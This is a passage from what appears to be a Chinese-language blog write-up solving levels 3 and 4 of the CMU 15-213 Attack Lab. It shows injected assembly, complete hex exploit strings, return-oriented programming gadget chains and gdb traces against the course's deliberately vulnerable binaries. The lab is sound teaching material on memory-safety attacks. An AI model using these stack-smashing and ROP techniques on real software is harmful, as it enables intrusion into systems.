<span class="line"><span style="color:#B392F0">        result</span><span style="color:#9ECBFF">  1:PASS:0xffffffff:ctarget:2:48</span><span style="color:#9ECBFF"> C7</span><span style="color:#9ECBFF"> C7</span><span style="color:#9ECBFF"> FA</span><span style="color:#79B8FF"> 97</span><span style="color:#9ECBFF"> B9</span><span style="color:#79B8FF"> 59</span><span style="color:#79B8FF"> 68</span><span style="color:#9ECBFF"> EC</span><span style="color:#79B8FF"> 17</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> C3</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 78</span><span style="color:#9ECBFF"> DC</span><span style="color:#79B8FF"> 61</span><span style="color:#79B8FF"> 55</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span></code></pre>
<h3 id="level-3">Level 3</h3>
<p>改成了传一个字符串参数</p>
<blockquote>
<p>Within the file <code>ctarget</code> there is code for functions hexmatch and <code>touch3</code> having the following C representations:
<img src="https://s2.loli.net/2025/08/17/BVg468kxKLSZfJI.png" alt="hexmatch" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/17/BVg468kxKLSZfJI.png?w=640 640w, https://s2.loli.net/2025/08/17/BVg468kxKLSZfJI.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px">
Your task is to get <code>CTARGET</code> to execute the code for <code>touch3</code> rather than returning to test. You must make it appear to <code>touch3</code> as if you have passed a string representation of your cookie as its argument.</p>
</blockquote>
<p>避免去查ascii，这里有一个小技巧</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">man</span><span style="color:#9ECBFF"> ascii</span></span></code></pre>
<p>注意到hex_march这里有一个*s,随机在一个栈的位置取值，根据后面的写法，这里用sprintf完成了从unsigned到string的转变。并且重写了部分栈的区域。</p>
<p>利用test的栈就行，test有8个栈帧的空间，足够用了</p>
<p>查询必要的信息</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"></span>
<span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> nm</span><span style="color:#9ECBFF"> ./ctarget</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#9ECBFF"> touch3</span></span>
<span class="line"><span style="color:#B392F0">00000000004018fa</span><span style="color:#9ECBFF"> T</span><span style="color:#9ECBFF"> touch3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0"> 1│</span><span style="color:#9ECBFF"> Dump</span><span style="color:#9ECBFF"> of</span><span style="color:#9ECBFF"> assembler</span><span style="color:#9ECBFF"> code</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> function</span><span style="color:#9ECBFF"> test:</span></span>
<span class="line"><span style="color:#B392F0"> 2│</span><span style="color:#9ECBFF"> visible.c:</span></span>
<span class="line"><span style="color:#B392F0"> 3│</span><span style="color:#79B8FF"> 90</span><span style="color:#9ECBFF">      in</span><span style="color:#9ECBFF"> visible.c</span></span>
<span class="line"><span style="color:#B392F0"> 4│</span><span style="color:#79B8FF">    0x0000000000401968</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     sub</span><span style="color:#E1E4E8">    $0x8</span><span style="color:#9ECBFF">,%rsp</span></span>
<span class="line"><span style="color:#B392F0"> 5│</span></span>
<span class="line"><span style="color:#B392F0"> 6│</span><span style="color:#79B8FF"> 91</span><span style="color:#9ECBFF">      in</span><span style="color:#9ECBFF"> visible.c</span></span>
<span class="line"><span style="color:#B392F0"> 7│</span><span style="color:#79B8FF"> 92</span><span style="color:#9ECBFF">      in</span><span style="color:#9ECBFF"> visible.c</span></span>
<span class="line"><span style="color:#B392F0"> 8├──</span><span style="color:#E1E4E8">> </span><span style="color:#79B8FF">0x000000000040196c</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">4></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     mov</span><span style="color:#E1E4E8">    $0x0</span><span style="color:#9ECBFF">,%eax</span></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">x/x</span><span style="color:#E1E4E8"> $rsp</span></span>
<span class="line"><span style="color:#B392F0">0x5561dca8:</span><span style="color:#79B8FF">     0x0000000000000009</span></span></code></pre>
<p>这里通过两个rsp的值相减，可以发现相差的rsp值在test与getbuf之间足足有48个栈帧。可见地址实际上由于padding的原因是补齐了4个字节的。</p>
<p>开始构造注入代码</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>main:</span></span>
<span class="line"><span>	movq	0x5561dca8, %rdi</span></span>
<span class="line"><span>	pushq	$0x4018fa</span></span>
<span class="line"><span>	ret</span></span></code></pre>
<p>然后相同的指令</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> gcc</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> injection.l3.s</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> objdump</span><span style="color:#79B8FF"> -d</span><span style="color:#9ECBFF"> injection.l3.o</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">injection.l3.o:</span><span style="color:#9ECBFF">     file</span><span style="color:#9ECBFF"> format</span><span style="color:#9ECBFF"> elf64-x86-64</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">Disassembly</span><span style="color:#9ECBFF"> of</span><span style="color:#9ECBFF"> section</span><span style="color:#9ECBFF"> .text:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">0000000000000000</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">mai</span><span style="color:#E1E4E8">n</span><span style="color:#F97583">></span><span style="color:#9ECBFF">:</span></span>
<span class="line"><span style="color:#B392F0">   0:</span><span style="color:#79B8FF">   48</span><span style="color:#9ECBFF"> c7</span><span style="color:#9ECBFF"> c7</span><span style="color:#9ECBFF"> a8</span><span style="color:#9ECBFF"> dc</span><span style="color:#79B8FF"> 61</span><span style="color:#79B8FF"> 55</span><span style="color:#9ECBFF">    mov</span><span style="color:#E1E4E8">    $0x5561dca8</span><span style="color:#9ECBFF">,%rdi</span></span>
<span class="line"><span style="color:#B392F0">   7:</span><span style="color:#79B8FF">   68</span><span style="color:#9ECBFF"> fa</span><span style="color:#79B8FF"> 18</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF">          push</span><span style="color:#E1E4E8">   $0x4018fa</span></span>
<span class="line"><span style="color:#B392F0">   c:</span><span style="color:#9ECBFF">   c3</span><span style="color:#9ECBFF">                      ret</span><span style="color:#E1E4E8">  </span></span></code></pre>
<p>然后构造exploit string，注意这里的排序，是顺序排的，从低到高。<code>strcmp</code>会解决这个字符串没有结尾的问题</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>48 c7 c7 a8 dc 61 55 68</span></span>
<span class="line"><span>fa 18 40 00 c3 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>78 DC 61 55 00 00 00 00</span></span>
<span class="line"><span>35 39 62 39 39 37 66 61</span></span></code></pre>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> ./ctarget</span><span style="color:#79B8FF"> -q</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l3.txt)</span></span>
<span class="line"><span style="color:#B392F0">Cookie:</span><span style="color:#79B8FF"> 0x59b997fa</span></span>
<span class="line"><span style="color:#B392F0">Touch3!:</span><span style="color:#9ECBFF"> You</span><span style="color:#9ECBFF"> called</span><span style="color:#9ECBFF"> touch3</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">"59b997fa"</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">Valid</span><span style="color:#9ECBFF"> solution</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> level</span><span style="color:#79B8FF"> 3</span><span style="color:#9ECBFF"> with</span><span style="color:#9ECBFF"> target</span><span style="color:#9ECBFF"> ctarget</span></span>
<span class="line"><span style="color:#B392F0">PASS:</span><span style="color:#9ECBFF"> Would</span><span style="color:#9ECBFF"> have</span><span style="color:#9ECBFF"> posted</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following:</span></span>
<span class="line"><span style="color:#B392F0">        user</span><span style="color:#9ECBFF"> id</span><span style="color:#9ECBFF"> bovik</span></span>
<span class="line"><span style="color:#B392F0">        course</span><span style="color:#9ECBFF">  15213-f15</span></span>
<span class="line"><span style="color:#B392F0">        lab</span><span style="color:#9ECBFF">     attacklab</span></span>
<span class="line"><span style="color:#B392F0">        result</span><span style="color:#9ECBFF">  1:PASS:0xffffffff:ctarget:3:48</span><span style="color:#9ECBFF"> C7</span><span style="color:#9ECBFF"> C7</span><span style="color:#9ECBFF"> A8</span><span style="color:#9ECBFF"> DC</span><span style="color:#79B8FF"> 61</span><span style="color:#79B8FF"> 55</span><span style="color:#79B8FF"> 68</span><span style="color:#9ECBFF"> FA</span><span style="color:#79B8FF"> 18</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> C3</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 78</span><span style="color:#9ECBFF"> DC</span><span style="color:#79B8FF"> 61</span><span style="color:#79B8FF"> 55</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 35</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 62</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 37</span><span style="color:#79B8FF"> 66</span><span style="color:#79B8FF"> 61</span><span style="color:#E1E4E8"> </span></span></code></pre>
<p>基本上构造出来就对了</p>
<p>好！所有<code>ctarget</code>都做完了，<strong>现在是另一种构造攻击了</strong></p>
<h3 id="level-4">Level 4</h3>
<p><strong>Part II: Return-Oriented Programming</strong></p>
<p>这种面向返回的攻击要比代码注入攻击要难的多，CMU介绍其主要具有两种技术点</p>
<blockquote>
<ul>
<li>It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.</li>
<li>It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault</li>
</ul>
<p>基本是说rtarget的代码采用了课程中提到的两种防范exploit string的方式。randomization的偏移，这使得注入代码不能被定位，此外，它标记了被栈持有的内存段无法被执行。</p>
</blockquote>
<p><img src="https://s2.loli.net/2025/08/18/IQMxRrSHa5Pv8om.png" alt="sequence of gatget" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/18/IQMxRrSHa5Pv8om.png?w=640 640w, https://s2.loli.net/2025/08/18/IQMxRrSHa5Pv8om.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<blockquote>
<p><del>为什么不用金丝雀，用了就很难攻击了</del></p>
</blockquote>
<p>通过提取function tailing的机器码构建gatget，在farm中包含了一些函数，这些函数的特殊tailing使得他们很适合这种攻击，从名字可以看出，这是tools’ farm。</p>
<p>可以尝试一下编译该文件</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> gcc</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> farm.c</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> objdump</span><span style="color:#79B8FF"> -d</span><span style="color:#9ECBFF"> farm.o</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> farm.d</span></span></code></pre>
<p>随便看一个函数</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>00000000000001c8 &#x3C;addval_187>:</span></span>
<span class="line"><span> 1c8:	f3 0f 1e fa          	endbr64 </span></span>
<span class="line"><span> 1cc:	55                   	push   %rbp</span></span>
<span class="line"><span> 1cd:	48 89 e5             	mov    %rsp,%rbp</span></span>
<span class="line"><span> 1d0:	89 7d fc             	mov    %edi,-0x4(%rbp)</span></span>
<span class="line"><span> 1d3:	8b 45 fc             	mov    -0x4(%rbp),%eax</span></span>
<span class="line"><span> 1d6:	2d 77 31 c7 3f       	sub    $0x3fc73177,%eax</span></span>
<span class="line"><span> 1db:	5d                   	pop    %rbp</span></span>
<span class="line"><span> 1dc:	c3                   	ret    </span></span></code></pre>
<p>可见相对于下面的rtarget莫名其妙调用了很多东西</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0000000000401a25 &#x3C;addval_187>:</span></span>
<span class="line"><span>  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax</span></span>
<span class="line"><span>  401a2b:	c3                   	ret    </span></span></code></pre>
<p>可见其中存在诸多例如调用rbp寄存器等无效操作，以及多出了一个endbr64等指令</p>
<ol>
<li><code>endbr64</code>: 这是一个防范ROP Attack的指令
- 它被插入到每个函数的入口处
- CPU 在执行 ret 指令时，如果目标地址指向一条 endbr64 指令，才允许跳转
- 如果 ret 跳转到了没有 endbr64 的地方（比如中间的 gadget），CPU 会触发 #CP 异常（Control Protection Fault），终止程序</li>
<li><code>-O2</code>: 普通的编译命令通常不采用优化，因此为了满足标准的汇编程序格式会有许多无效操作，例如上述代码中的rbp</li>
</ol>
<p>采用O2优化<code>-O2</code>以及禁用CET<code>-fcf-protection=none</code>后</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0000000000000160 &#x3C;addval_187>:</span></span>
<span class="line"><span> 164:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax</span></span>
<span class="line"><span> 16a:	c3                   	ret    </span></span>
<span class="line"><span> 16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span></span></code></pre>
<p><code> 16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</code>:这一句只是5字节的填充模板，intel推荐的NOP模板</p>





























<table><thead><tr><th>填充字节</th><th>汇编</th></tr></thead><tbody><tr><td>2</td><td>66 90→nopw %ax</td></tr><tr><td>3</td><td>0f 1f 00→nopl (%rax)</td></tr><tr><td>4</td><td>0f 1f 40 00→nopl 0x0(%rax)</td></tr><tr><td>5</td><td>0f 1f 44 00 00→nopl 0x0(%rax,%rax,1)</td></tr><tr><td>6</td><td>66 0f 1f 44 00 00→nopw 0x0(%rax,%rax,1)</td></tr></tbody></table>
<p>这样看就和rtarget很近似了</p>
<p>然后看一下Level 4的题面</p>
<p>重复Level 2的操作</p>
<p><code>TIPs</code>:</p>
<ol>
<li>所有gadgets都可以在rtarget中找到，这块区域由start_farm和end_farm划分</li>
<li>秩序两个工具完成该攻击</li>
<li>漏洞利用代码应包含小工具地址和数据的组合</li>
</ol>
<p>recall一下Level 2的汇编</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi</span></span>
<span class="line"><span>pushq   $0x4017ec</span></span>
<span class="line"><span>ret</span></span></code></pre>
<p>问题在于，如何把cookie中的立即数传进rdi</p>
<p><img src="https://s2.loli.net/2025/08/18/IZM3zdxjB9u64Hl.png" alt="Appendix" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/18/IZM3zdxjB9u64Hl.png?w=640 640w, https://s2.loli.net/2025/08/18/IZM3zdxjB9u64Hl.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>应该明确一些rules</p>
<ol>
<li>所有数据都被存放在栈中</li>
<li>仅能通过返回值调用tailing代码</li>
</ol>
<p>因此，立即数仅能被存放在栈中，并且仅能通过pop放置在寄存器中。
查表可知pop %rdi为5f。查询可知submitr函数中，有以5f结尾,地址为402b19。
查询touch2地址为4017ec</p>
<p>直接构造</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>19 2b 40 00 00 00 00 00</span></span>
<span class="line"><span>fa 97 b9 59 00 00 00 00</span></span>
<span class="line"><span>ec 17 40 00 00 00 00 00</span></span></code></pre>
<p>理论上这是正确的，在调用touch2时rdi被赋值为正确的值。但是用到了并非tools <code>farm</code> 中的函数，实际运行发生了意料之外的<code>segment fault</code></p>
<p>尝试另一种解法，通过rax作为中间函数,通过<code>ROP</code>构造这样的gadget序列</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pop %rax</span></span>
<span class="line"><span>mov %rax %rdi</span></span>
<span class="line"><span>ret</span></span></code></pre>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>ab 19 40 00 00 00 00 00</span></span>
<span class="line"><span>fa 97 b9 59 00 00 00 00</span></span>
<span class="line"><span>c5 19 40 00 00 00 00 00</span></span>
<span class="line"><span>ec 17 40 00 00 00 00 00</span></span></code></pre>
<p>这个就对了，可以尝试比较这两个输入的执行流</p>
<p>首先查看一下这个PASS的执行流，可见其在执行完cmp<code>coockie</code>和edi后jne顺利跳转到visible文件的段中</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>21│ visible.c:</span></span>
<span class="line"><span>22│    0x0000000000401818 &#x3C;+44>:    mov    $0x2,%edi</span></span>
<span class="line"><span>23│    0x000000000040181d &#x3C;+49>:    call   0x401dad &#x3C;validate></span></span>
<span class="line"><span>24│    0x0000000000401822 &#x3C;+54>:    jmp    0x401842 &#x3C;touch2+86></span></span></code></pre>
<p>该处执行到call后跳转至</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>│ 48      in visible.c</span></span>
<span class="line"><span>38│ 49      in visible.c</span></span>
<span class="line"><span>39├──> 0x0000000000401842 &#x3C;+86>:    mov    $0x0,%edi</span></span>
<span class="line"><span>40│    0x0000000000401847 &#x3C;+91>:    call   0x400e40 &#x3C;exit@plt></span></span></code></pre>
<p>随后执行到exit结束</p>
<p>然后看一下上面那个错误的执行流,则在比较完edi与rip后直接跳转到了系统库的stdio2.h中</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>14│ /usr/include/x86_64-linux-gnu/bits/stdio2.h:</span></span>
<span class="line"><span>15│ 105       return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,</span></span>
<span class="line"><span>16├──> 0x0000000000401804 &#x3C;+24>:    mov    $0x403208,%esi</span></span>
<span class="line"><span>17│    0x0000000000401809 &#x3C;+29>:    mov    $0x1,%edi</span></span>
<span class="line"><span>18│    0x000000000040180e &#x3C;+34>:    mov    $0x0,%eax</span></span>
<span class="line"><span>19│    0x0000000000401813 &#x3C;+39>:    call   0x400df0 &#x3C;__printf_chk@plt></span></span></code></pre>
<p>可见两者在比较完rip,edi中出现了不同，探索更多信息</p>
<p>以下是正常PASS也就是通过rax传参的具体参数</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">rax</span><span style="color:#79B8FF">            0x59b997fa</span><span style="color:#79B8FF">          1505335290</span></span>
<span class="line"><span style="color:#B392F0">rbx</span><span style="color:#79B8FF">            0x7fffffffdce8</span><span style="color:#79B8FF">      140737488346344</span></span>
<span class="line"><span style="color:#B392F0">rcx</span><span style="color:#79B8FF">            0xd6</span><span style="color:#79B8FF">                214</span></span>
<span class="line"><span style="color:#B392F0">rdx</span><span style="color:#79B8FF">            0x59b997fa</span><span style="color:#79B8FF">          1505335290</span></span>
<span class="line"><span style="color:#B392F0">rsi</span><span style="color:#79B8FF">            0x30</span><span style="color:#79B8FF">                48</span></span>
<span class="line"><span style="color:#B392F0">rdi</span><span style="color:#79B8FF">            0x59b997fa</span><span style="color:#79B8FF">          1505335290</span></span>
<span class="line"><span style="color:#B392F0">rbp</span><span style="color:#79B8FF">            0x7fffffffdba0</span><span style="color:#79B8FF">      0x7fffffffdba0</span></span>
<span class="line"><span style="color:#B392F0">rsp</span><span style="color:#79B8FF">            0x7ffffffca330</span><span style="color:#79B8FF">      0x7ffffffca330</span></span>
<span class="line"><span style="color:#B392F0">r8</span><span style="color:#79B8FF">             0xa</span><span style="color:#79B8FF">                 10</span></span>
<span class="line"><span style="color:#B392F0">r9</span><span style="color:#79B8FF">             0x607890</span><span style="color:#79B8FF">            6322320</span></span>
<span class="line"><span style="color:#B392F0">r10</span><span style="color:#79B8FF">            0x77</span><span style="color:#79B8FF">                119</span></span>
<span class="line"><span style="color:#B392F0">r11</span><span style="color:#79B8FF">            0x246</span><span style="color:#79B8FF">               582</span></span>
<span class="line"><span style="color:#B392F0">r12</span><span style="color:#79B8FF">            0x4</span><span style="color:#79B8FF">                 4</span></span>
<span class="line"><span style="color:#B392F0">r13</span><span style="color:#79B8FF">            0x0</span><span style="color:#79B8FF">                 0</span></span>
<span class="line"><span style="color:#B392F0">r14</span><span style="color:#79B8FF">            0x0</span><span style="color:#79B8FF">                 0</span></span>
<span class="line"><span style="color:#B392F0">r15</span><span style="color:#79B8FF">            0x7ffff7ffd040</span><span style="color:#79B8FF">      140737354125376</span></span>
<span class="line"><span style="color:#B392F0">rip</span><span style="color:#79B8FF">            0x401802</span><span style="color:#79B8FF">            0x401802</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">touch2+2</span><span style="color:#F97583">2></span></span>
<span class="line"><span style="color:#B392F0">--Type</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">RE</span><span style="color:#E1E4E8">T</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> more,</span><span style="color:#9ECBFF"> q</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> quit,</span><span style="color:#9ECBFF"> c</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> continue</span><span style="color:#9ECBFF"> without</span><span style="color:#9ECBFF"> paging--</span><span style="color:#E1E4E8"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">x/16gx</span><span style="color:#E1E4E8"> $rsp</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca330:</span><span style="color:#79B8FF"> 0x00000000004017ec</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f400</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca340:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca350:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca360:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca370:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca380:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca390:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffffca3a0:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span></code></pre>
